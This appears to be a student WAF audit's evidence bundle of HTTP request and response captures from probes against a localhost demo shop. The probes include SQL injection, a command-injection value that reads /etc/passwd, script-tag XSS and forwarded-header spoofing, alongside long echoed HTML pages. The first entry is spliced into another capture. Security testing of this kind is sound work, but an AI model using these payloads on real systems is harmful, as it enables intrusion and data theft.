╔══════════════════════════════════════════════════════════════════╗
║  WAF PRE-DEPLOYMENT AUDIT · BUNDLE COMPLETO DE EVIDENCIA          ║
║  TPE Protección de Servicios con WAF · ITBA · 1C 2026             ║
║  Capturado: 2026-04-16T21:47:03.538Z                ║
║  Target:    http://localhost                                      ║
║  Total PoCs: 16                                                   ║
╚══════════════════════════════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
### EVIDENCIA · PoC1-Prometheus-leak
### Capturado: 2026-04-16T21:47:03.170Z
### Target: http://localhost

--- REQUEST ---
GET /actuator/prometheus HTTP/1.1
### Capturado: 2026-04-16T21:47:03.292Z
### Target: http://localhost

--- REQUEST ---
GET /proxy/orders/anything HTTP/1.1
Host: localhost

--- RESPONSE ---
HTTP/1.1 404
connection: keep-alive
content-length: 104
content-type: application/json
date: Thu, 16 Apr 2026 21:47:03 GMT
vary: Origin, Access-Control-Request-Method, Access-Control-Request-Headers

{"timestamp":"2026-04-16T21:47:03.282+00:00","status":404,"error":"Not Found","path":"/orders/anything"}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
### EVIDENCIA · PoC10-SSRF-checkout-backend
### Capturado: 2026-04-16T21:47:03.310Z
### Target: http://localhost

--- REQUEST ---
GET /proxy/checkout/anything HTTP/1.1
Host: localhost

--- RESPONSE ---
HTTP/1.1 404
connection: keep-alive
content-length: 69
content-type: application/json; charset=utf-8
date: Thu, 16 Apr 2026 21:47:03 GMT
etag: W/"45-Bu16IjxE7G87GVm1Ni6Q1CVLuiU"
x-powered-by: Express

{"message":"Checkout not found","error":"Not Found","statusCode":404}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
### EVIDENCIA · PoC11-SQLi-catalog
### Capturado: 2026-04-16T21:47:03.466Z
### Target: http://localhost

--- REQUEST ---
GET /catalog?tag=' OR '1'='1 HTTP/1.1
Host: localhost

--- RESPONSE ---
HTTP/1.1 200
connection: keep-alive
content-encoding: gzip
content-language: en
content-length: 2704
content-type: text/html
date: Thu, 16 Apr 2026 21:47:03 GMT

<!doctype html>
<html
  lang="en"
>
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Demo Store</title>

    <!-- Font Awesome -->
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.0/css/all.min.css"
    />

    <link
      rel="stylesheet"
      href="/assets/css/theme-default.css"
    />

    <link rel="stylesheet" href="/assets/css/styles.css" />

    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
      tailwind.config = {
        theme: {
          extend: {
            colors: {
              primary: {
                DEFAULT: "rgb(var(--primary-color-500))",
                50: "rgb(var(--primary-color-50))",
                100: "rgb(var(--primary-color-100))",
                200: "rgb(var(--primary-color-20))",
                300: "rgb(var(--primary-color-300))",
                400: "rgb(var(--primary-color-400))",
                500: "rgb(var(--primary-color-500))",
                600: "rgb(var(--primary-color-600))",
                700: "rgb(var(--primary-color-700))",
                800: "rgb(var(--primary-color-800))",
                900: "rgb(var(--primary-color-900))",
              },
            },
          },
        },
      };
    </script>
    <script>
      /*<![CDATA[*/
      var retailContextPath = "\/";
      /*]]>*/
    </script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/showdown/2.1.0/showdown.min.js"></script>
    
  </head>

  <body class="flex flex-col min-h-screen">
    <body>
    <!-- Navigation -->
    <nav class="bg-white">
      <div class="max-w-4xl mx-auto px-4">
        <div class="flex justify-between items-center h-16">
          <a href="/">
            <div class="flex items-center">
              <i class="fas fa-briefcase text-2xl text-primary-500"></i>
              <span class="ml-2 text-xl text-gray-800">&nbsp;</span>
            </div>
          </a>
          <div class="flex items-center space-x-12">
            <a
              id="menu-home"
              href="/"
              class="hover:text-primary-500 transition duration-300 text-sm"
              >Home</a
            >
            <a
              id="menu-catalog"
              href="/catalog"
              class="hover:text-primary-500 transition duration-300 text-sm"
              >Gadget Repository</a
            >
          </div>
          <!-- Cart Button with Count -->
          <div class="flex items-center">
            <a href="/cart" id="go-cart">
              <button
                class="flex items-center gap-2 p-2 text-gray-700 hover:text-primary-500"
              >
                <i class="fas fa-shopping-cart text-lg"></i>
                <span
                  class="bg-primary-500 text-white text-xs rounded-full h-5 min-w-[1.25rem] flex items-center justify-center switch-other"
                >0</span>
              </button>
            </a>
          </div>
        </div>
      </div>
    </nav>

    <!-- Main Content Area (can be filled with products) -->
    <main class="flex-grow">
      <!-- Content goes here -->
      <body>
    <section class="max-w-4xl mx-auto px-4 py-8">
      <div class="flex flex-col md:flex-row gap-8">
        <!-- Sidebar Filter -->
        <div class="w-full md:w-36 h-fit">
          <h3 class="font-semibold text-gray-800 mb-4 uppercase text-xs">
            Categories
          </h3>
          <ul class="space-y-2 text-sm category-menu">
            <li>
              <a
                href="/catalog?page=1"
                class="text-gray-600 hover:text-primary-500 block py-1"
                >All Products</a
              >
            </li>
            <li>
              <a
                href="/catalog?page=1&amp;tag=accessories"
                class="text-gray-600 hover:text-primary-500 block py-1"
                >Accessories</a
              >
            </li>
            <li>
              <a
                href="/catalog?page=1&amp;tag=clothing"
                class="text-gray-600 hover:text-primary-500 block py-1"
                >Clothing</a
              >
            </li>
            <li>
              <a
                href="/catalog?page=1&amp;tag=food"
                class="text-gray-600 hover:text-primary-500 block py-1"
                >Food</a
              >
            </li>
            <li>
              <a
                href="/catalog?page=1&amp;tag=vehicles"
                class="text-gray-600 hover:text-primary-500 block py-1"
                >Vehicles</a
              >
            </li>
          </ul>
        </div>

        <!-- Product Grid -->
        <div class="flex-1">
          <div>
            <div
              class="text-center mb-4 text-sm text-gray-400"
            >
              These products are for demonstration purposes only
            </div>
            <div class="grid grid-cols-2 lg:grid-cols-3 gap-6">
              <!-- Product Card 1 -->
              
            </div>
          </div>
          <!-- Pagination -->
          <div class="flex justify-center mt-8">
            <nav
              class="inline-flex items-center rounded-lg bg-white border border-gray-200 pagination"
              aria-label="Pagination"
            >
              <a
                href="/catalog?page=1&amp;tag=&#39;%20OR%20&#39;1&#39;%3D&#39;1"
              >
                <button
                  class="inline-flex items-center justify-center w-10 h-10 border-r border-gray-200 text-gray-500 hover:bg-gray-50"
                >
                  <span class="sr-only">Previous</span>
                  <i class="fas fa-minus text-xs"></i></button
              ></a>

              <a
                href="/catalog?page=1&amp;tag=&#39;%20OR%20&#39;1&#39;%3D&#39;1"
              >
                <button
                  class="inline-flex items-center justify-center w-10 h-10 border-r border-gray-200 bg-primary-50 text-primary-500"
                >1</button></a
              ><a
                href="/catalog?page=0&amp;tag=&#39;%20OR%20&#39;1&#39;%3D&#39;1"
              >
                <button
                  class="inline-flex items-center justify-center w-10 h-10 border-r border-gray-200 text-gray-700 hover:bg-gray-50"
                >0</button></a
              >

              <a
                href="/catalog?page=2&amp;tag=&#39;%20OR%20&#39;1&#39;%3D&#39;1"
              >
                <button
                  class="inline-flex items-center justify-center w-10 h-10 text-gray-500 hover:bg-gray-50"
                >
                  <span class="sr-only">Next</span>
                  <i class="fas fa-plus text-xs"></i>
                </button>
              </a>
            </nav>
          </div>
        </div>
      </div>
    </section>
  </body>
    </main>
  </body>

    <!-- Footer -->
    <footer class="bg-white mt-auto text-sm">
      <!-- Grey Separator Line -->
      <!-- Footer Content -->
      <div class="max-w-6xl mx-auto px-4 py-8">
        <div class="border-t border-gray-200"></div>
        <div class="grid grid-cols-3 gap-8 py-8 max-w-2xl text-center m-auto">
          <!-- Quick Links -->
          <div>
            <h3 class="text-gray-800 font-semibold mb-4 uppercase text-xs">
              Quick Links
            </h3>
            <ul class="space-y-2">
              <li>
                <a
                  href="/catalog"
                  class="text-gray-400 hover:text-primary-500"
                  >Gadget Repository</a
                >
              </li>
              <li>
                <a
                  href="#"
                  class="text-gray-400 hover:text-primary-500"
                  >About</a
                >
              </li>
            </ul>
          </div>

          <!-- Tools -->
          <div>
            <h3 class="text-gray-800 font-semibold mb-4 uppercase text-xs">
              Tools
            </h3>
            <ul class="space-y-2">
              <li>
                <a
                  href="/info"
                  class="text-gray-400 hover:text-primary-500"
                  >Information</a
                >
              </li>
              <li>
                <a
                  href="/topology"
                  class="text-gray-400 hover:text-primary-500"
                  >Topology</a
                >
              </li>
            </ul>
          </div>

          <!-- Contact Info -->
          <div>
            <h3 class="text-gray-800 font-semibold mb-4 uppercase text-xs">
              Contact
            </h3>
            <ul class="space-y-2">
              <li class="text-gray-400">
                <i class="fas fa-envelope mr-2"></i>
                Email
              </li>
              <li class="text-gray-400">
                <i class="fas fa-phone mr-2"></i>
                Phone
              </li>
            </ul>
          </div>
        </div>
        <div class="text-center text-gray-400">
          This site is for demonstration purposes only
        </div>
      </div>
    </footer>
    <!-- Chat trigger button -->
    <div id="chat-trigger-container" class="fixed bottom-4 right-4 hidden">
      <button
        id="chat-trigger"
        class="px-6 py-3 bg-primary-600 text-white rounded-full hover:bg-primary-500 focus:outline-none focus:ring-2 focus:ring-primary-500 shadow-lg"
      >
        <i class="fas fa-comments"></i> Chat
      </button>
    </div>
    <!-- Chat -->
    <div
      id="chat-modal"
      class="fixed inset-0 bg-black bg-opacity-50 hidden flex items-center justify-center z-20"
    >
      <div
        class="bg-white rounded-lg shadow-xl p-4 max-w-4xl w-full mx-4 relative"
      >
        <div class="flex items-start justify-between mb-4">
          <div class="flex items-center space-x-3">
            <!-- Avatar with online status -->
            <div class="relative">
              <img
                src="/assets/img/chat-avatar-mini.jpg"
                alt="A.G.E.N.T Avatar"
                class="w-16 h-16 rounded-full object-cover"
              />
              <div
                class="absolute bottom-0 right-0 w-3 h-3 bg-green-500 border-2 border-white rounded-full"
              ></div>
            </div>

            <!-- Title and subtitle -->
            <div class="flex flex-col">
              <h1 class="text-lg font-semibold text-gray-800">A.G.E.N.T</h1>
              <p class="text-xs text-gray-500">
                Automated Gadget Expert Navigation Tool
              </p>
            </div>
          </div>

          <!-- Close button -->
          <button id="close-chat" class="text-gray-500 hover:text-gray-700">
            <i class="fas fa-times text-xl"></i>
          </button>
        </div>

        <div
          id="chat-messages"
          class="space-y-4 mb-4 h-96 overflow-y-auto p-4 rounded text-sm bg-gray-100"
        ></div>
        <div class="flex gap-2 text-sm">
          <input
            type="text"
            id="user-input"
            class="flex-1 px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-primary-500"
            placeholder="Type your message..."
          />
          <button
            id="send-button"
            class="px-6 py-2 bg-primary-500 text-white rounded-lg hover:bg-primary-500 focus:outline-none focus:ring-2 focus:ring-primary-500"
          >
            <i class="fas fa-paper-plane"></i> Send
          </button>
          <button
            id="clear-button"
            class="px-6 py-2 border border-red-500 text-red-500 hover:bg-red-500 hover:text-white rounded-lg transition-colors duration-200 focus:outline-none focus:ring-2 focus:ring-red-500"
          >
            <i class="fas fa-trash"></i>
          </button>
        </div>
      </div>
    </div>
  </body>
</html>


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
### EVIDENCIA · PoC12-RCE-catalog
### Capturado: 2026-04-16T21:47:03.476Z
### Target: http://localhost

--- REQUEST ---
GET /catalog?tag=;%20cat%20/etc/passwd HTTP/1.1
Host: localhost

--- RESPONSE ---
HTTP/1.1 200
connection: keep-alive
content-encoding: gzip
content-language: en
content-length: 2700
content-type: text/html
date: Thu, 16 Apr 2026 21:47:03 GMT

<!doctype html>
<html
  lang="en"
>
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Demo Store</title>

    <!-- Font Awesome -->
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.0/css/all.min.css"
    />

    <link
      rel="stylesheet"
      href="/assets/css/theme-default.css"
    />

    <link rel="stylesheet" href="/assets/css/styles.css" />

    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
      tailwind.config = {
        theme: {
          extend: {
            colors: {
              primary: {
                DEFAULT: "rgb(var(--primary-color-500))",
                50: "rgb(var(--primary-color-50))",
                100: "rgb(var(--primary-color-100))",
                200: "rgb(var(--primary-color-20))",
                300: "rgb(var(--primary-color-300))",
                400: "rgb(var(--primary-color-400))",
                500: "rgb(var(--primary-color-500))",
                600: "rgb(var(--primary-color-600))",
                700: "rgb(var(--primary-color-700))",
                800: "rgb(var(--primary-color-800))",
                900: "rgb(var(--primary-color-900))",
              },
            },
          },
        },
      };
    </script>
    <script>
      /*<![CDATA[*/
      var retailContextPath = "\/";
      /*]]>*/
    </script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/showdown/2.1.0/showdown.min.js"></script>
    
  </head>

  <body class="flex flex-col min-h-screen">
    <body>
    <!-- Navigation -->
    <nav class="bg-white">
      <div class="max-w-4xl mx-auto px-4">
        <div class="flex justify-between items-center h-16">
          <a href="/">
            <div class="flex items-center">
              <i class="fas fa-briefcase text-2xl text-primary-500"></i>
              <span class="ml-2 text-xl text-gray-800">&nbsp;</span>
            </div>
          </a>
          <div class="flex items-center space-x-12">
            <a
              id="menu-home"
              href="/"
              class="hover:text-primary-500 transition duration-300 text-sm"
              >Home</a
            >
            <a
              id="menu-catalog"
              href="/catalog"
              class="hover:text-primary-500 transition duration-300 text-sm"
              >Gadget Repository</a
            >
          </div>
          <!-- Cart Button with Count -->
          <div class="flex items-center">
            <a href="/cart" id="go-cart">
              <button
                class="flex items-center gap-2 p-2 text-gray-700 hover:text-primary-500"
              >
                <i class="fas fa-shopping-cart text-lg"></i>
                <span
                  class="bg-primary-500 text-white text-xs rounded-full h-5 min-w-[1.25rem] flex items-center justify-center switch-other"
                >0</span>
              </button>
            </a>
          </div>
        </div>
      </div>
    </nav>

    <!-- Main Content Area (can be filled with products) -->
    <main class="flex-grow">
      <!-- Content goes here -->
      <body>
    <section class="max-w-4xl mx-auto px-4 py-8">
      <div class="flex flex-col md:flex-row gap-8">
        <!-- Sidebar Filter -->
        <div class="w-full md:w-36 h-fit">
          <h3 class="font-semibold text-gray-800 mb-4 uppercase text-xs">
            Categories
          </h3>
          <ul class="space-y-2 text-sm category-menu">
            <li>
              <a
                href="/catalog?page=1"
                class="text-gray-600 hover:text-primary-500 block py-1"
                >All Products</a
              >
            </li>
            <li>
              <a
                href="/catalog?page=1&amp;tag=accessories"
                class="text-gray-600 hover:text-primary-500 block py-1"
                >Accessories</a
              >
            </li>
            <li>
              <a
                href="/catalog?page=1&amp;tag=clothing"
                class="text-gray-600 hover:text-primary-500 block py-1"
                >Clothing</a
              >
            </li>
            <li>
              <a
                href="/catalog?page=1&amp;tag=food"
                class="text-gray-600 hover:text-primary-500 block py-1"
                >Food</a
              >
            </li>
            <li>
              <a
                href="/catalog?page=1&amp;tag=vehicles"
                class="text-gray-600 hover:text-primary-500 block py-1"
                >Vehicles</a
              >
            </li>
          </ul>
        </div>

        <!-- Product Grid -->
        <div class="flex-1">
          <div>
            <div
              class="text-center mb-4 text-sm text-gray-400"
            >
              These products are for demonstration purposes only
            </div>
            <div class="grid grid-cols-2 lg:grid-cols-3 gap-6">
              <!-- Product Card 1 -->
              
            </div>
          </div>
          <!-- Pagination -->
          <div class="flex justify-center mt-8">
            <nav
              class="inline-flex items-center rounded-lg bg-white border border-gray-200 pagination"
              aria-label="Pagination"
            >
              <a
                href="/catalog?page=1&amp;tag=;%20cat%20/etc/passwd"
              >
                <button
                  class="inline-flex items-center justify-center w-10 h-10 border-r border-gray-200 text-gray-500 hover:bg-gray-50"
                >
                  <span class="sr-only">Previous</span>
                  <i class="fas fa-minus text-xs"></i></button
              ></a>

              <a
                href="/catalog?page=1&amp;tag=;%20cat%20/etc/passwd"
              >
                <button
                  class="inline-flex items-center justify-center w-10 h-10 border-r border-gray-200 bg-primary-50 text-primary-500"
                >1</button></a
              ><a
                href="/catalog?page=0&amp;tag=;%20cat%20/etc/passwd"
              >
                <button
                  class="inline-flex items-center justify-center w-10 h-10 border-r border-gray-200 text-gray-700 hover:bg-gray-50"
                >0</button></a
              >

              <a
                href="/catalog?page=2&amp;tag=;%20cat%20/etc/passwd"
              >
                <button
                  class="inline-flex items-center justify-center w-10 h-10 text-gray-500 hover:bg-gray-50"
                >
                  <span class="sr-only">Next</span>
                  <i class="fas fa-plus text-xs"></i>
                </button>
              </a>
            </nav>
          </div>
        </div>
      </div>
    </section>
  </body>
    </main>
  </body>

    <!-- Footer -->
    <footer class="bg-white mt-auto text-sm">
      <!-- Grey Separator Line -->
      <!-- Footer Content -->
      <div class="max-w-6xl mx-auto px-4 py-8">
        <div class="border-t border-gray-200"></div>
        <div class="grid grid-cols-3 gap-8 py-8 max-w-2xl text-center m-auto">
          <!-- Quick Links -->
          <div>
            <h3 class="text-gray-800 font-semibold mb-4 uppercase text-xs">
              Quick Links
            </h3>
            <ul class="space-y-2">
              <li>
                <a
                  href="/catalog"
                  class="text-gray-400 hover:text-primary-500"
                  >Gadget Repository</a
                >
              </li>
              <li>
                <a
                  href="#"
                  class="text-gray-400 hover:text-primary-500"
                  >About</a
                >
              </li>
            </ul>
          </div>

          <!-- Tools -->
          <div>
            <h3 class="text-gray-800 font-semibold mb-4 uppercase text-xs">
              Tools
            </h3>
            <ul class="space-y-2">
              <li>
                <a
                  href="/info"
                  class="text-gray-400 hover:text-primary-500"
                  >Information</a
                >
              </li>
              <li>
                <a
                  href="/topology"
                  class="text-gray-400 hover:text-primary-500"
                  >Topology</a
                >
              </li>
            </ul>
          </div>

          <!-- Contact Info -->
          <div>
            <h3 class="text-gray-800 font-semibold mb-4 uppercase text-xs">
              Contact
            </h3>
            <ul class="space-y-2">
              <li class="text-gray-400">
                <i class="fas fa-envelope mr-2"></i>
                Email
              </li>
              <li class="text-gray-400">
                <i class="fas fa-phone mr-2"></i>
                Phone
              </li>
            </ul>
          </div>
        </div>
        <div class="text-center text-gray-400">
          This site is for demonstration purposes only
        </div>
      </div>
    </footer>
    <!-- Chat trigger button -->
    <div id="chat-trigger-container" class="fixed bottom-4 right-4 hidden">
      <button
        id="chat-trigger"
        class="px-6 py-3 bg-primary-600 text-white rounded-full hover:bg-primary-500 focus:outline-none focus:ring-2 focus:ring-primary-500 shadow-lg"
      >
        <i class="fas fa-comments"></i> Chat
      </button>
    </div>
    <!-- Chat -->
    <div
      id="chat-modal"
      class="fixed inset-0 bg-black bg-opacity-50 hidden flex items-center justify-center z-20"
    >
      <div
        class="bg-white rounded-lg shadow-xl p-4 max-w-4xl w-full mx-4 relative"
      >
        <div class="flex items-start justify-between mb-4">
          <div class="flex items-center space-x-3">
            <!-- Avatar with online status -->
            <div class="relative">
              <img
                src="/assets/img/chat-avatar-mini.jpg"
                alt="A.G.E.N.T Avatar"
                class="w-16 h-16 rounded-full object-cover"
              />
              <div
                class="absolute bottom-0 right-0 w-3 h-3 bg-green-500 border-2 border-white rounded-full"
              ></div>
            </div>

            <!-- Title and subtitle -->
            <div class="flex flex-col">
              <h1 class="text-lg font-semibold text-gray-800">A.G.E.N.T</h1>
              <p class="text-xs text-gray-500">
                Automated Gadget Expert Navigation Tool
              </p>
            </div>
          </div>

          <!-- Close button -->
          <button id="close-chat" class="text-gray-500 hover:text-gray-700">
            <i class="fas fa-times text-xl"></i>
          </button>
        </div>

        <div
          id="chat-messages"
          class="space-y-4 mb-4 h-96 overflow-y-auto p-4 rounded text-sm bg-gray-100"
        ></div>
        <div class="flex gap-2 text-sm">
          <input
            type="text"
            id="user-input"
            class="flex-1 px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-primary-500"
            placeholder="Type your message..."
          />
          <button
            id="send-button"
            class="px-6 py-2 bg-primary-500 text-white rounded-lg hover:bg-primary-500 focus:outline-none focus:ring-2 focus:ring-primary-500"
          >
            <i class="fas fa-paper-plane"></i> Send
          </button>
          <button
            id="clear-button"
            class="px-6 py-2 border border-red-500 text-red-500 hover:bg-red-500 hover:text-white rounded-lg transition-colors duration-200 focus:outline-none focus:ring-2 focus:ring-red-500"
          >
            <i class="fas fa-trash"></i>
          </button>
        </div>
      </div>
    </div>
  </body>
</html>


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
### EVIDENCIA · PoC13-XSS-checkout
### Capturado: 2026-04-16T21:47:03.508Z
### Target: http://localhost

--- REQUEST ---
POST /checkout HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 120

firstName=%3Cscript%3Ealert(1)%3C%2Fscript%3E&lastName=Doe&email=a@b.com&address1=100+Main&city=A&state=CA&zipCode=11111

--- RESPONSE ---
HTTP/1.1 500
connection: keep-alive
content-length: 136
content-type: application/json
date: Thu, 16 Apr 2026 21:47:03 GMT

{"timestamp":"2026-04-16T21:47:03.498+00:00","path":"/checkout","status":500,"error":"Internal Server Error","requestId":"ec8968f8-809"}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
### EVIDENCIA · PoC14-Spoof-XForwarded
### Capturado: 2026-04-16T21:47:03.521Z
### Target: http://localhost

--- REQUEST ---
GET / HTTP/1.1
Host: localhost
X-Forwarded-For: 8.8.8.8
X-Forwarded-Proto: https
X-Forwarded-Host: evil-bank.com

--- RESPONSE ---
HTTP/1.1 200
connection: keep-alive
content-encoding: gzip
content-language: en
content-length: 4302
content-type: text/html
date: Thu, 16 Apr 2026 21:47:03 GMT

<!doctype html>
<html
  lang="en"
>
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Demo Store</title>

    <!-- Font Awesome -->
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.0/css/all.min.css"
    />

    <link
      rel="stylesheet"
      href="/assets/css/theme-default.css"
    />

    <link rel="stylesheet" href="/assets/css/styles.css" />

    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
      tailwind.config = {
        theme: {
          extend: {
            colors: {
              primary: {
                DEFAULT: "rgb(var(--primary-color-500))",
                50: "rgb(var(--primary-color-50))",
                100: "rgb(var(--primary-color-100))",
                200: "rgb(var(--primary-color-20))",
                300: "rgb(var(--primary-color-300))",
                400: "rgb(var(--primary-color-400))",
                500: "rgb(var(--primary-color-500))",
                600: "rgb(var(--primary-color-600))",
                700: "rgb(var(--primary-color-700))",
                800: "rgb(var(--primary-color-800))",
                900: "rgb(var(--primary-color-900))",
              },
            },
          },
        },
      };
    </script>
    <script>
      /*<![CDATA[*/
      var retailContextPath = "\/";
      /*]]>*/
    </script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/showdown/2.1.0/showdown.min.js"></script>
    
  </head>

  <body class="flex flex-col min-h-screen">
    <body>
    <nav
      class="fixed top-0 left-0 right-0 z-50 transition-all duration-300"
      id="navbar"
    >
      <div class="menu-marker bg-transparent">
        <div class="max-w-4xl mx-auto px-4">
          <div class="flex justify-between items-center h-16">
            <a href="/">
              <div class="flex items-center">
                <i class="fas fa-briefcase text-2xl text-white switch"></i>
                <span class="ml-2 text-xl text-white switch">&nbsp;</span>
              </div>
            </a>
            <div class="flex items-center space-x-12">
              <a
                id="menu-home"
                href="/"
                class="text-white/90 hover:text-white transition duration-300 text-sm switch"
                >Home</a
              >
              <a
                id="menu-catalog"
                href="/catalog"
                class="text-white/90 hover:text-white transition duration-300 text-sm switch"
                >Gadget Repository</a
              >
            </div>
            <!-- Cart Button with Count -->
            <div class="flex items-center">
              <a href="/cart" id="go-cart">
                <button
                  class="flex items-center gap-2 p-2 text-white hover:text-white/80"
                >
                  <i class="fas fa-shopping-cart text-lg switch"></i>
                  <span
                    class="bg-white text-gray-700 text-xs rounded-full h-5 min-w-[1.25rem] flex items-center justify-center switch-other"
                  >0</span>
                </button>
              </a>
            </div>
          </div>
        </div>
      </div>

      <script>
        // Add scroll effect to navbar
        const navbar = document.getElementById("navbar");

        window.addEventListener("scroll", () => {
          if (window.scrollY > 50) {
            navbar
              .querySelector("div.menu-marker")
              .classList.remove("bg-transparent");
            navbar
              .querySelector("div.menu-marker")
              .classList.add(
                "bg-white/80",
                "backdrop-blur-md",
                "border-b",
                "border-white/10",
              );
            // Change text color on scroll
            navbar
              .querySelectorAll("a.switch, span.switch, i.switch")
              .forEach((element) => {
                element.classList.remove("text-white", "text-white/90");
                element.classList.add("text-gray-700");
              });
            navbar.querySelectorAll("span.switch-other").forEach((element) => {
              element.classList.remove("bg-white", "text-gray-700");
              element.classList.add("bg-primary-500", "text-white");
            });
          } else {
            navbar
              .querySelector("div.menu-marker")
              .classList.add("bg-transparent");
            navbar
              .querySelector("div.menu-marker")
              .classList.remove(
                "bg-white/80",
                "backdrop-blur-md",
                "border-b",
                "border-white/10",
              );
            // Restore text color
            navbar
              .querySelectorAll("a.switch, span.switch, i.switch")
              .forEach((element) => {
                element.classList.add("text-white");
                element.classList.remove("text-gray-700");
              });
            navbar.querySelectorAll("span.switch-other").forEach((element) => {
              element.classList.add("bg-white", "text-gray-700");
              element.classList.remove("bg-primary-500", "text-white");
            });
          }
        });
      </script>
    </nav>

    <!-- Hero Section -->
    <section
      class="relative flex items-center justify-center overflow-hidden h-[500px]"
    >
      <!-- Background Image with Overlay -->
      <div class="absolute inset-0">
        <img
          src="/assets/img/hero.jpg"
          alt="Hero Background"
          class="w-full h-full object-cover"
        />
        <div class="absolute inset-0 bg-black/70"></div>
        <div class="absolute inset-0">
          <svg width="100%" height="100%">
            <defs>
              <pattern
                id="grid"
                width="40"
                height="40"
                patternUnits="userSpaceOnUse"
              >
                <path
                  d="M 40 0 L 0 0 0 40"
                  fill="none"
                  stroke="rgba(255,255,255,0.1)"
                  stroke-width="1"
                />
              </pattern>
            </defs>
            <rect width="100%" height="100%" fill="url(#grid)" />
          </svg>
        </div>
        <div
          class="absolute bottom-0 left-0 right-0 h-48 bg-gradient-to-t from-white to-transparent"
        ></div>
      </div>

      <!-- Content -->
      <div class="relative z-10 max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
        <h1 class="text-4xl sm:text-5xl font-bold text-white mb-6">
          The most public <span class="text-primary-400">Secret Shop</span>
        </h1>
        <p
          class="text-xl md:text-2xl text-white/90 mb-8 max-w-2xl mx-auto text-gray-300"
        >
          Everything a secret agent needs, minus the paperwork
        </p>
        <div class="flex gap-4">
          <a
            id="shop-now"
            href="/catalog"
            class="relative inline-flex items-center gap-2 px-6 py-3 text-lg font-semibold text-white bg-primary-500 rounded-md hover:bg-primary-700 transition-colors overflow-hidden border border-gray-400"
          >
            <span class="relative z-10">Explore</span>
            <i class="fas fa-arrow-right relative z-10"></i>
            <div
              class="absolute inset-0 h-full w-[200%] animate-beam bg-gradient-to-r from-transparent via-white/20 to-transparent"
            ></div>
          </a>
        </div>
      </div>
    </section>

    <!-- Main Content Area (can be filled with products) -->
    <main class="flex-grow">
      <!-- Content goes here -->
      <!-- Popular products -->
      <section class="max-w-4xl mx-auto px-4 py-8">
        <div
          class="flex justify-between items-center mb-8 border-b border-gray-200 pb-4"
        >
          <h2
            class="text-2xl font-bold text-gray-700"
          >Mission Critical Gear</h2>
          <a
            href="/catalog"
            class="inline-flex items-center text-sm text-primary-500 hover:text-primary-500 font-medium transition duration-150 ease-in-out border-b-2 border-transparent hover:border-primary-500"
          >
